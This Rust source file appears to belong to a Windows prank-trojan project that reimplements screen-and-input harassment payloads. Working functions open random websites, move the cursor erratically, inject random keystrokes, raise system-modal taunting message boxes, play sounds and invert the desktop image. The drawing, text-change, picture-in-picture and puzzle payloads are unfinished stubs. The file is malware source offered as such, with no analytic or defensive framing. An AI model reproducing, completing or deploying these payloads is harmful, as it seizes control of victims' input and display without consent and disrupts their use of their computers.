use std::{mem::size_of, thread};

use super::{define::PAYLOAD, system::msg_box_hook};
use crate::{
    convert_str::ToPCSTRWrapper,
    data::{
        msg::{n_sounds, SOUNDS},
        sites::{N_SITES, SITES},
    },
    utils::log::{write_log, LogLocation, LogType},
    wrap_windows_api::{
        wrap_get_current_thread_id, wrap_get_system_metrics, wrap_messagebox_a,
        wrap_set_windows_hook_ex_a, wrap_shell_execute_a, wrap_unhook_windows_hook_ex, WinError,
    },
};
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{GetLastError, HMODULE, HWND, POINT, RECT},
        Graphics::Gdi::{BitBlt, GetWindowDC, NOTSRCCOPY},
        Media::Audio::{PlaySoundA, SND_ASYNC},
        System::LibraryLoader::GetModuleHandleA,
        UI::{
            Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_KEYBOARD, VIRTUAL_KEY},
            WindowsAndMessaging::{
                GetCursorPos, GetDesktopWindow, GetWindowRect, SetCursorPos, MB_ICONWARNING, MB_OK,
                MB_SYSTEMMODAL, SM_CXICON, SM_CYICON, SW_SHOWDEFAULT, WH_CBT,
            },
        },
    },
};

pub const PAYLOADS: &[PAYLOAD] = &[
    PAYLOAD {
        payload_function: payload_execute,
        delay: 30000,
    },
    PAYLOAD {
        payload_function: payload_cursor,
        delay: 30000,
    },
    PAYLOAD {
        payload_function: payload_message_box,
        delay: 20000,
    },
    PAYLOAD {
        payload_function: payload_keyboard,
        delay: 20000,
    },
    PAYLOAD {
        payload_function: payload_sound,
        delay: 50000,
    },
    PAYLOAD {
        payload_function: payload_blink,
        delay: 30000,
    },
    PAYLOAD {
        payload_function: payload_draw_errors,
        delay: 10000,
    },
    PAYLOAD {
        payload_function: payload_change_text,
        delay: 40000,
    },
    PAYLOAD {
        payload_function: payload_pip,
        delay: 60000,
    },
    PAYLOAD {
        payload_function: payload_puzzle,
        delay: 15000,
    },
];

fn payload_execute(times: i32, _runtime: i32) -> i32 {
    wrap_shell_execute_a(
        HWND::default(),
        "open",
        SITES[rand::random::<usize>() % N_SITES],
        PCSTR::null(),
        PCSTR::null(),
        SW_SHOWDEFAULT,
    )
    .expect("Failed ShellExecuteA()");

    (1500.0 / (times as f32 / 15.0 + 1.0) + 100.0 + (rand::random::<f32>() % 200.0)) as i32
}

fn payload_cursor(_times: i32, runtime: i32) -> i32 {
    let mut cursor: POINT = Default::default();
    unsafe {
        GetCursorPos(&mut cursor);
        SetCursorPos(
            cursor.x
                + (rand::random::<i32>() % 3 - 1) * (rand::random::<i32>() % (runtime / 2200 + 2)),
            cursor.y
                + (rand::random::<i32>() % 3 - 1) * (rand::random::<i32>() % (runtime / 2200 + 2)),
        );
    }
    2
}

fn payload_message_box(times: i32, _runtime: i32) -> i32 {
    let message_box_thread = thread::spawn(move || -> Result<(), WinError> {
        let hook = wrap_set_windows_hook_ex_a(
            WH_CBT,
            Some(msg_box_hook),
            HMODULE::default(),
            wrap_get_current_thread_id(),
        )?;
        wrap_messagebox_a(
            HWND::default(),
            "Still using this computer?",
            "lol",
            MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING,
        )?;
        wrap_unhook_windows_hook_ex(hook)?;

        Ok(())
    });
    message_box_thread.join().unwrap().unwrap();

    (2000.0 / (times as f32 / 8.0 + 1.0) + 20.0 + (rand::random::<f32>() % 30.0)) as i32
}

fn payload_keyboard(_: i32, _: i32) -> i32 {
    let mut input: INPUT = INPUT {
        ..Default::default()
    };

    input.r#type = INPUT_KEYBOARD;
    input.Anonymous.ki.wVk = VIRTUAL_KEY((rand::random::<u16>() % (0x5a - 0x30)) + 0x30);

    unsafe {
        match SendInput(&[input], size_of::<INPUT>() as i32) {
            0 => {
                #[cfg(not(feature = "DEBUG_MODE"))]
                write_log(
                    LogType::ERROR,
                LogLocation::MSG,
                &format!(
                        "Failed SendInput()\nError: Input was already blocked by another thread\nGetLastError: {:?}", 
                        GetLastError()
                    )
                );
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                LogLocation::ALL,
                &format!(
                        "Failed SendInput()\nError: Input was already blocked by another thread\nGetLastError: {:?}", 
                        GetLastError()
                    )
                );
                None
            }
            v => Some(v),
        };
    }
    300 + (rand::random::<i32>() % 40)
}

fn payload_sound(_times: i32, _runtime: i32) -> i32 {
    unsafe {
        let hmod = match GetModuleHandleA(PCSTR::null()) {
            Ok(v) => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::INFO,
                    LogLocation::ALL,
                    "SUCCESS GetModuleHandleA()",
                );
                Some(v)
            }
            Err(e) => {
                #[cfg(not(feature = "DEBUG_MODE"))]
                write_log(
                    LogType::ERROR,
                    LogLocation::MSG,
                    &format!(
                        "Failed GetModuleHandleA()\nError: {e}\nGetLastError: {:?}",
                        GetLastError()
                    ),
                );
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    LogLocation::ALL,
                    &format!(
                        "Failed GetModuleHandleA()\nError: {e}\nGetLastError: {:?}",
                        GetLastError()
                    ),
                );
                None
            }
        };

        match PlaySoundA(
            *SOUNDS[rand::random::<usize>() % n_sounds()].to_pcstr(),
            hmod.unwrap(),
            SND_ASYNC,
        )
        .as_bool()
        {
            true => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(LogType::INFO, LogLocation::ALL, "SUCCESS PlaySoundA()");
            }
            false => {
                #[cfg(not(feature = "DEBUG_MODE"))]
                write_log(
                    LogType::ERROR,
                LogLocation::MSG,
                &format!(
                        "Failed PlaySoundA()\nError: function can find neither the system default entry nor the default sound\nGetLastError: {:?}", 
                        GetLastError()
                    )
                );
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                LogLocation::ALL,
                &format!(
                        "Failed PlaySoundA()\nError: function can find neither the system default entry nor the default sound\nGetLastError: {:?}", 
                        GetLastError()
                    )
                );
            }
        }
    }
    20 + (rand::random::<i32>() % 20)
}

fn payload_blink(_times: i32, _runtime: i32) -> i32 {
    unsafe {
        let hwnd = GetDesktopWindow();
        let hdc = GetWindowDC(hwnd);
        let mut rekt: RECT = Default::default();
        match GetWindowRect(hwnd, &mut rekt).as_bool() {
            true => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(LogType::INFO, LogLocation::ALL, "SUCCESS GetWindowRect()");
            }
            false => {
                #[cfg(not(feature = "DEBUG_MODE"))]
                write_log(
                    LogType::ERROR,
                    LogLocation::MSG,
                    &format!("Failed GetWindowRect()\nGetLastError: {:?}", GetLastError()),
                );
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    LogLocation::ALL,
                    &format!("Failed GetWindowRect()\nGetLastError: {:?}", GetLastError()),
                );
            }
        };
        match BitBlt(
            hdc,
            0,
            0,
            rekt.right - rekt.left,
            rekt.bottom - rekt.top,
            hdc,
            0,
            0,
            NOTSRCCOPY,
        )
        .as_bool()
        {
            true => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(LogType::INFO, LogLocation::ALL, "SUCCESS BitBlt()");
            }
            false => {
                #[cfg(not(feature = "DEBUG_MODE"))]
                write_log(
                    LogType::ERROR,
                    LogLocation::MSG,
                    &format!("Failed BitBlt()\nGetLastError: {:?}", GetLastError()),
                );
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    LogLocation::ALL,
                    &format!("Failed BitBlt()\nGetLastError: {:?}", GetLastError()),
                );
            }
        }
    }
    100
}

fn payload_draw_errors(times: i32, runtime: i32) -> i32 {
    let (ix, iy) = (
        wrap_get_system_metrics(SM_CXICON).expect("Failed GetSystemMetrics"),
        wrap_get_system_metrics(SM_CYICON).expect("Failed GetSystemMetrics"),
    );

    todo!()
}

fn payload_change_text(times: i32, runtime: i32) -> i32 {
    todo!()
}

fn payload_pip(times: i32, runtime: i32) -> i32 {
    todo!()
}

fn payload_puzzle(times: i32, runtime: i32) -> i32 {
    todo!()
}
